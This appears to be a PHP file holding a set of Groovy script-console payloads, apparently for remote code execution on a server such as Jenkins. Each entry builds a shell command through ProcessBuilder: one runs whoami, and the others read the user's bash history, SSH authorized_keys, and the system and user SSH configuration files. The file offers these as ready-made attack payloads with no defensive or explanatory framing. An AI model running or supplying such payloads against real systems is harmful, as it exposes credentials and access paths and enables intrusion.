<?php

$scripts["user"] = "println new ProcessBuilder('sh','-c','whoami').redirectErrorStream(true).start().text";

$scripts["history"] = "println new ProcessBuilder('sh','-c','cat ~/.bash_history').redirectErrorStream(true).start().text";

$scripts["keys"] = "println new ProcessBuilder('sh','-c','cat ~/.ssh/authorized_keys').redirectErrorStream(true).start().text";

$scripts["ssh_config"] = "println new ProcessBuilder('sh','-c','cat /etc/ssh/ssh_config').redirectErrorStream(true).start().text";

$scripts["ssh_config2"] = "println new ProcessBuilder('sh','-c','cat ~/.ssh/config').redirectErrorStream(true).start().text";
